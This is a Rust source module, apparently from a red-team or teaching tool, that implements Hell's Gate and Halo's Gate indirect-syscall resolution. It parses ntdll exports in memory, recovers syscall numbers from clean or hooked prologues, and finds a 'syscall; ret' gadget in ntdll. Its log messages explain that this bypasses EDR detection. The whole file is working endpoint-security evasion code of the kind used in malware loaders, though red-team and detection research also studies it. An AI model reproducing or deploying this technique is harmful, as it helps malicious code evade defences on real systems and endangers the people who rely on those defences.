use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ResolutionMethod {
    HellsGate,
    HalosGate,
}

impl ResolutionMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "hellsgate" | "hells_gate" | "hells-gate" | "hell" | "hells" => {
                Some(ResolutionMethod::HellsGate)
            }
            "halosgate" | "halos_gate" | "halos-gate" | "halo" | "halos" => {
                Some(ResolutionMethod::HalosGate)
            }
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            ResolutionMethod::HellsGate => "Hell's Gate",
            ResolutionMethod::HalosGate => "Halo's Gate",
        }
    }
}

#[derive(Debug)]
pub struct ResolvedSyscall {
    pub func_name: String,
    pub ssn: u32,
    pub syscall_gadget: usize,
    pub method: ResolutionMethod,
}

const CLEAN_PROLOGUE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];
const SYSCALL_RET: [u8; 3] = [0x0F, 0x05, 0xC3];

pub fn dry_run(func_name: &str, log: &LogSink) {
    log.info("[DRY RUN] Indirect Syscall Resolution".to_string());
    log.detail(format!("  Target: {func_name}"));
    log.info(String::new());
    log.detail("  Steps that would execute:".to_string());
    log.detail("    [1/4] GetModuleHandleA(\"ntdll.dll\") → base address".to_string());
    log.detail("    [2/4] Parse PE export table → find target function RVA".to_string());
    log.detail(format!(
        "    [3/4] Read function prologue → extract SSN for {func_name}"
    ));
    log.detail("    [4/4] Scan ntdll .text for syscall;ret (0F 05 C3) gadget".to_string());
    log.info(String::new());
    log.detail("  Hell's Gate (clean function):".to_string());
    log.detail("    If prologue is 4C 8B D1 B8 xx xx 00 00 → SSN = bytes[4..8]".to_string());
    log.info(String::new());
    log.detail("  Halo's Gate (hooked function):".to_string());
    log.detail("    Prologue doesn't match → function is hooked by EDR".to_string());
    log.detail("    Check neighboring Zw* exports at distance ±1, ±2, ...".to_string());
    log.detail("    If neighbor is clean, SSN = neighbor_ssn ± distance".to_string());
    log.info(String::new());
    log.warning("  The syscall instruction executes from ntdll's own .text section,".to_string());
    log.warning(
        "  so EDR checks for 'syscall called from outside ntdll' are bypassed.".to_string(),
    );
}

pub fn print_info(log: &LogSink) {
    log.info("=== Indirect Syscalls (Hell's Gate / Halo's Gate) ===".to_string());
    log.info(String::new());
    log.detail("Indirect syscalls resolve SSNs at runtime by reading ntdll in memory,".to_string());
    log.detail(
        "then jump to a 'syscall; ret' gadget inside ntdll's own .text section.".to_string(),
    );
    log.info(String::new());
    log.detail("Hell's Gate:".to_string());
    log.detail("  Parse ntdll PE export table, read each Nt* function's prologue.".to_string());
    log.detail("  Clean functions start with: mov r10,rcx; mov eax,<SSN>".to_string());
    log.detail("  Bytes: 4C 8B D1 B8 xx xx 00 00 → SSN is the u32 at offset 4.".to_string());
    log.info(String::new());
    log.detail("Halo's Gate (EDR has hooked the function):".to_string());
    log.detail("  If the target's prologue is patched (JMP, INT3, etc.), it's hooked.".to_string());
    log.detail("  Walk to neighboring Zw* functions in the sorted export table.".to_string());
    log.detail("  If neighbor at distance ±N is clean, target SSN = neighbor_ssn ∓ N.".to_string());
    log.info(String::new());
    log.detail("Syscall gadget:".to_string());
    log.detail("  Scan ntdll .text section for the byte pattern 0F 05 C3 (syscall; ret).".to_string());
    log.detail("  Set eax=SSN, set up args, then JMP to this gadget address.".to_string());
    log.detail("  The syscall instruction runs from ntdll memory — legitimate to EDRs.".to_string());
    log.info(String::new());
    log.detail("Why it works:".to_string());
    log.detail("  - Direct syscalls from your .text get flagged (outside ntdll)".to_string());
    log.detail("  - Indirect syscalls jump INTO ntdll to execute syscall".to_string());
    log.detail("  - SSN resolved from memory, not hardcoded (version-independent)".to_string());
    log.warning("  Limitations: kernel callbacks still see the syscall".to_string());
}

#[cfg(windows)]
pub fn resolve(func_name: &str, log: &LogSink) -> Result<ResolvedSyscall, String> {
    let base = crate::pe::get_module_base("ntdll.dll")?;

    log.step(format!(
        "[1/4] ntdll.dll base: 0x{:016X}",
        base as usize
    ));

    let exports = crate::pe::parse_exports(base, log)?;

    log.step(format!("[2/4] Parsed {} exports from ntdll", exports.len()));

    let sorted_zw: Vec<(usize, &str, u32)> = {
        let mut v: Vec<_> = exports
            .iter()
            .filter(|e| e.name.starts_with("Zw"))
            .map(|e| (0usize, e.name.as_str(), e.rva))
            .collect();
        v.sort_by_key(|&(_, _, rva)| rva);
        v.into_iter()
            .enumerate()
            .map(|(i, (_, name, rva))| (i, name, rva))
            .collect()
    };

    let nt_to_zw = func_name.replacen("Nt", "Zw", 1);
    let target_idx = sorted_zw
        .iter()
        .position(|(_, name, _)| *name == nt_to_zw)
        .ok_or_else(|| format!("{func_name} (as {nt_to_zw}) not found in sorted Zw* table"))?;

    let target_entry = exports
        .iter()
        .find(|e| e.name == func_name)
        .ok_or_else(|| format!("{func_name} not found in export table"))?;
    let func_addr = unsafe { base.add(target_entry.rva as usize) };
    let func_bytes: &[u8] = unsafe { std::slice::from_raw_parts(func_addr as *const u8, 32) };

    log.step(format!(
        "[3/4] {} at 0x{:016X}",
        func_name, func_addr as usize
    ));

    let hex_str: String = func_bytes
        .iter()
        .take(16)
        .map(|b| format!("{b:02x}"))
        .collect::<Vec<_>>()
        .join(" ");
    log.detail(format!("  Bytes: {hex_str}"));

    let (ssn, method) =
        if func_bytes.len() >= 8 && func_bytes[0..4] == CLEAN_PROLOGUE {
            let ssn = u32::from_le_bytes([
                func_bytes[4],
                func_bytes[5],
                func_bytes[6],
                func_bytes[7],
            ]);
            log.info(format!(
                "  Hell's Gate: clean prologue → SSN = 0x{ssn:X} ({ssn})"
            ));
            (ssn, ResolutionMethod::HellsGate)
        } else {
            log.warning(format!(
                "  Function is HOOKED — prologue doesn't match clean pattern"
            ));
            log.detail("  Falling back to Halo's Gate (neighbor resolution)".to_string());

            let mut found: Option<(u32, i32)> = None;
            for distance in 1..=20i32 {
                for dir in &[-1i32, 1i32] {
                    let neighbor_idx = target_idx as i32 + (distance * dir);
                    if neighbor_idx < 0 || neighbor_idx >= sorted_zw.len() as i32 {
                        continue;
                    }
                    let (_, neighbor_zw, neighbor_rva) = sorted_zw[neighbor_idx as usize];
                    let neighbor_nt = format!("Nt{}", &neighbor_zw[2..]);
                    if let Some(ne) = exports.iter().find(|e| e.name == neighbor_nt) {
                        let n_addr = unsafe { base.add(ne.rva as usize) };
                        let n_bytes: &[u8] =
                            unsafe { std::slice::from_raw_parts(n_addr as *const u8, 8) };
                        if n_bytes.len() >= 8 && n_bytes[0..4] == CLEAN_PROLOGUE {
                            let n_ssn = u32::from_le_bytes([
                                n_bytes[4], n_bytes[5], n_bytes[6], n_bytes[7],
                            ]);
                            let _ = neighbor_rva;
                            found = Some((n_ssn, distance * dir));
                            log.detail(format!(
                                "  Clean neighbor: {neighbor_nt} (distance {dir}×{distance}), SSN = 0x{n_ssn:X}"
                            ));
                            break;
                        }
                    }
                }
                if found.is_some() {
                    break;
                }
            }

            match found {
                Some((neighbor_ssn, signed_dist)) => {
                    let ssn = (neighbor_ssn as i32 - signed_dist) as u32;
                    log.info(format!(
                        "  Halo's Gate: SSN = 0x{ssn:X} ({ssn}) (neighbor 0x{neighbor_ssn:X} offset {signed_dist})"
                    ));
                    (ssn, ResolutionMethod::HalosGate)
                }
                None => {
                    return Err(format!(
                        "Halo's Gate failed: no clean neighbor found within ±20 of {func_name}"
                    ));
                }
            }
        };

    let text = crate::pe::find_text_section(base)?;
    let gadgets = crate::pe::scan_for_pattern(text.base, text.size, &SYSCALL_RET);

    if gadgets.is_empty() {
        return Err("no syscall;ret gadget found in ntdll .text".to_string());
    }

    let gadget = gadgets[0];
    log.step(format!(
        "[4/4] syscall;ret gadget at 0x{gadget:016X} ({} candidates found)",
        gadgets.len()
    ));

    log.info(String::new());
    log.info(format!("  ✓ Indirect syscall resolved for {func_name}"));
    log.detail(format!("    SSN:    0x{ssn:X} ({ssn})"));
    log.detail(format!("    Gadget: 0x{gadget:016X}"));
    log.detail(format!("    Method: {}", method.name()));
    log.info(String::new());
    log.detail("  Usage: mov r10,rcx; mov eax,SSN; jmp [gadget]".to_string());

    Ok(ResolvedSyscall {
        func_name: func_name.to_string(),
        ssn,
        syscall_gadget: gadget,
        method,
    })
}

#[cfg(not(windows))]
pub fn resolve(func_name: &str, log: &LogSink) -> Result<ResolvedSyscall, String> {
    log.warning(format!(
        "  Indirect syscall resolution requires Windows. Would resolve {func_name}."
    ));
    Err("indirect syscall resolution is only available on Windows".to_string())
}
